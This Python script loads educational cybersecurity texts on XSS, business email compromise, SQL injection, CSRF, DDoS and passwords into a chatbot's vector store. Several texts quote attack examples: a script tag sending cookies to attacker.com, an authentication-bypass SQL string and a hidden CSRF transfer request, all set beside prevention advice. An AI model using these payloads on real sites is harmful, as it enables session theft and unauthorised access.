# update_vectorstore.py
import os
from langchain_community.vectorstores import FAISS
from langchain_community.embeddings import HuggingFaceEmbeddings
from langchain.text_splitter import RecursiveCharacterTextSplitter
from langchain.schema import Document

print("=" * 60)
print("ADDING NEW CYBERSECURITY DATA TO CHATBOT")
print("=" * 60)

# Load existing vectorstore
vectorstore_path = "vectorstore/faiss_index"

if not os.path.exists(vectorstore_path):
    print("❌ Vectorstore not found! Creating new one...")
    embeddings = HuggingFaceEmbeddings(model_name="sentence-transformers/all-MiniLM-L6-v2")
    existing_vectorstore = FAISS.from_documents([], embeddings)
else:
    print("📚 Loading existing vectorstore...")
    embeddings = HuggingFaceEmbeddings(model_name="sentence-transformers/all-MiniLM-L6-v2")
    existing_vectorstore = FAISS.load_local(vectorstore_path, embeddings, allow_dangerous_deserialization=True)
    print("✓ Existing vectorstore loaded")

new_documents = []

# ============================================
# DATA 1: XSS (Cross-Site Scripting) - Detailed
# ============================================
new_documents.append(Document(
    page_content="""Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.

Types of XSS:
1. Stored XSS: Malicious script is permanently stored on the target server (database, comment section, forum)
2. Reflected XSS: Script is reflected off a web server (via error messages, search results)
3. DOM-based XSS: Vulnerability exists in client-side code rather than server-side

How XSS works:
- Attacker finds input field that doesn't validate user input
- Injects malicious JavaScript code
- Code executes in victims' browsers when they view the page
- Can steal cookies, session tokens, or perform actions on behalf of users

Example of malicious input:
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

Impact:
- Session hijacking and account takeover
- Theft of sensitive data (passwords, credit cards)
- Defacement of websites
- Distribution of malware
- Keylogging and screen capture

Prevention:
- Output encoding/escaping (convert < to &lt;)
- Input validation and sanitization
- Content Security Policy (CSP) headers
- Use HTTP-only cookies
- Regular security scanning
- Use modern web frameworks with built-in XSS protection

Real-world examples: MySpace Samy worm (2005), Twitter XSS (2010), eBay XSS (2013)""",
    metadata={"source": "xss_detailed", "topic": "Cross-Site Scripting"}
))

# ============================================
# DATA 2: BEC (Business Email Compromise) - Your Data
# ============================================
new_documents.append(Document(
    page_content="""Business Email Compromise (BEC): Sophisticated scam targeting companies that do wire transfers or have suppliers abroad.

How BEC works:
1. Attacker researches target company (executives, financial departments)
2. Spoofs or compromises executive email account
3. Sends urgent request for wire transfer to employee
4. Employee transfers money to attacker's account

BEC statistics:
- Over $50 billion in reported losses (FBI)
- Average loss per incident: $130,000
- 65% of BEC attacks target wire transfers
- 25% of attacks request gift cards

Common BEC scenarios:
- CEO Fraud: Fake email from CEO requesting urgent payment
- Vendor Email Compromise: Attacker compromises supplier's email
- Attorney Impersonation: Fake legal request for confidential info
- Employee impersonation: Fake request to change direct deposit

How attackers execute BEC:
- Use lookalike domains (rnicrosoft.com instead of microsoft.com)
- Email spoofing to fake the "From" address
- Compromised legitimate email accounts via phishing
- Email forwarding rules to hide their tracks

Prevention strategies:
- Implement multi-factor authentication (MFA) for all email
- Verify payment requests by phone or in person (never via email)
- Create payment verification policies requiring two approvals
- Train employees to inspect email headers for spoofing
- Use email filtering to detect spoofed domains
- Implement DMARC, DKIM, SPF to prevent email spoofing
- Monitor for unusual login locations or times
- Conduct simulated BEC exercises with employees

What to do if targeted:
- Do not respond to suspicious emails
- Verify through another communication channel
- Report to IT security team
- Never share passwords or financial info via email""",
    metadata={"source": "bec_attack", "topic": "Business Email Compromise"}
))

# ============================================
# DATA 3: SQL Injection - Detailed
# ============================================
new_documents.append(Document(
    page_content="""SQL Injection is a web security vulnerability that allows attackers to interfere with database queries.

How SQL Injection works:
- Attacker enters malicious SQL code into input fields
- Application sends this unsanitized input to database
- Database executes the malicious code
- Attacker can read, modify, or delete data

Example of SQL Injection:
Login form asks for username and password.
Attacker enters: admin' OR '1'='1' --
This might bypass authentication and grant admin access.

Types of SQL Injection:
1. In-band SQLi: Attacker uses same channel for attack and results
2. Blind SQLi: No visible error messages, attacker infers structure
3. Out-of-band SQLi: Attack triggered using different channels

Impact:
- Unauthorized access to sensitive data
- Data theft (passwords, credit cards, personal info)
- Data modification or deletion
- Complete database compromise
- Potential server takeover

Prevention:
- Use parameterized queries (prepared statements)
- Input validation and sanitization (whitelist approach)
- Stored procedures with limited permissions
- Escape user input properly
- Use ORM frameworks that handle SQL safely
- Least privilege principle for database accounts
- Regular security testing and code reviews

Famous SQL Injection attacks:
- Heartland Payment Systems (2008) - 130 million cards exposed
- Sony Pictures (2011) - 1 million user accounts leaked
- TalkTalk (2015) - 157,000 customer records stolen""",
    metadata={"source": "sql_injection_detailed", "topic": "SQL Injection"}
))

# ============================================
# DATA 4: CSRF - Detailed
# ============================================
new_documents.append(Document(
    page_content="""Cross-Site Request Forgery (CSRF) tricks authenticated users into performing unintended actions.

How CSRF works:
1. User logs into legitimate website (e.g., bank.com)
2. While still logged in, user visits malicious website
3. Malicious site sends forged request to bank.com
4. Browser includes authentication cookies automatically
5. Bank processes the request as legitimate

Example:
<img src="https://bank.com/transfer?amount=1000&to=attacker" style="display:none">
When user views this image, money is transferred without their knowledge.

CSRF vs XSS:
- XSS exploits trust user has in website
- CSRF exploits trust website has in user's browser
- XSS can bypass CSRF protections

Impact:
- Unauthorized fund transfers
- Password changes
- Account takeover
- Data modification
- Any action user can perform, attacker can trigger

Prevention:
- CSRF tokens (unique, unpredictable values in forms)
- SameSite cookie attribute (Lax or Strict)
- Verify Origin and Referer headers
- Require re-authentication for sensitive actions
- Use custom request headers for AJAX
- Implement CAPTCHA for critical operations

Modern frameworks with CSRF protection:
- Django (built-in CSRF tokens)
- Rails (built-in CSRF protection)
- Spring Security (CSRF enabled by default)
- Laravel (automatic CSRF tokens)""",
    metadata={"source": "csrf_detailed", "topic": "CSRF"}
))

# ============================================
# DATA 5: DoS vs DDoS Comparison
# ============================================
new_documents.append(Document(
    page_content="""DoS vs DDoS Attacks: Comparison and differences.

Denial of Service (DoS):
- Single source attacking a target
- One computer or connection used
- Easier to trace and block
- Lower volume of traffic
- Example: Ping of Death, SYN flood

Distributed Denial of Service (DDoS):
- Multiple sources (botnet) attacking simultaneously
- Hundreds or thousands of compromised devices
- Harder to trace and block
- Very high volume of traffic
- Example: UDP flood, HTTP flood

Common DDoS attack types:
1. Volume-based: Saturates bandwidth (UDP floods, ICMP floods)
2. Protocol-based: Exhausts server resources (SYN floods, Ping of Death)
3. Application-layer: Targets web applications (HTTP floods, Slowloris)

DDoS botnet sources:
- Compromised IoT devices (Mirai botnet - 600,000 devices)
- Infected computers
- Cloud services used maliciously
- Reflected amplification attacks

Impact differences:
- DoS: Brief service disruption, local impact
- DDoS: Large-scale, potentially days of downtime

Prevention for both:
- Rate limiting
- Traffic filtering
- Load balancers
- Web Application Firewall (WAF)
- CDN services (Cloudflare, Akamai)
- DDoS mitigation services
- Proper server configuration
- Network monitoring and alerting

Famous DDoS attacks:
- GitHub (2018): 1.35 Tbps
- AWS (2020): 2.3 Tbps
- Dyn DNS (2016): Took down major sites (Twitter, Netflix, Reddit)""",
    metadata={"source": "dos_ddos", "topic": "DoS vs DDoS"}
))

# ============================================
# DATA 6: Password Security Best Practices
# ============================================
new_documents.append(Document(
    page_content="""Password Security: Best practices for creating and managing strong passwords.

What makes a strong password:
- Minimum 12 characters (16+ recommended)
- Mix of uppercase and lowercase letters
- Include numbers (0-9)
- Include special characters (!@#$%^&*)
- No dictionary words or common patterns
- No personal information (birthdays, names)

Password strength comparison:
- 6 characters (lowercase only): Cracked instantly
- 8 characters (mix): Cracked in hours
- 10 characters (full): Cracked in months
- 12+ characters (full): Cracked in centuries

Common mistakes to avoid:
- Using same password across multiple sites
- Writing passwords on sticky notes
- Sharing passwords via email or text
- Using 'password123', 'admin', 'qwerty'
- Saving passwords in unencrypted files

Better alternatives to passwords:
- Passphrases: "Correct-Horse-Battery-Staple" (easy to remember, hard to crack)
- Password managers: Generate and store unique strong passwords
- Biometrics: Fingerprint, face recognition
- Hardware tokens: YubiKey
- Passwordless authentication

How to manage passwords:
1. Use a reputable password manager (Bitwarden, 1Password, LastPass, Keepass)
2. Generate unique 16+ character passwords for each site
3. Enable Two-Factor Authentication (2FA) wherever possible
4. Never reuse passwords across different accounts
5. Change passwords only when compromised (not on arbitrary schedule)

Multi-Factor Authentication (MFA) types:
- SMS or email codes (least secure)
- Authenticator apps (Google Authenticator, Authy)
- Push notifications (Duo, Microsoft Authenticator)
- Hardware keys (YubiKey, Titan) - most secure""",
    metadata={"source": "password_security", "topic": "Password Best Practices"}
))

# ============================================
# MERGE AND SAVE
# ============================================

print(f"\n📝 Adding {len(new_documents)} new documents...")

# Split into chunks
text_splitter = RecursiveCharacterTextSplitter(
    chunk_size=500,
    chunk_overlap=50,
    separators=["\n\n", "\n", " ", ""]
)

all_chunks = []
for doc in new_documents:
    chunks = text_splitter.split_documents([doc])
    all_chunks.extend(chunks)

print(f"✓ Split into {len(all_chunks)} chunks")

# Add to existing vectorstore
print("\n🔧 Merging new data with existing vectorstore...")
existing_vectorstore.add_documents(all_chunks)

# Save
print("\n💾 Saving updated vectorstore...")
existing_vectorstore.save_local(vectorstore_path)

print("\n" + "=" * 60)
print("✅ UPDATE COMPLETE!")
print("=" * 60)
print("\n📚 Your chatbot can now answer:")
print("   ✓ What is XSS? (Cross-Site Scripting)")
print("   ✓ How does BEC work? (Business Email Compromise)")
print("   ✓ What is SQL Injection?")
print("   ✓ What is CSRF?")
print("   ✓ Difference between DoS and DDoS?")
print("   ✓ Password security best practices")
print("\n🎉 Restart your chatbot and ask these questions!")
print("   streamlit run app.py")
print("=" * 60)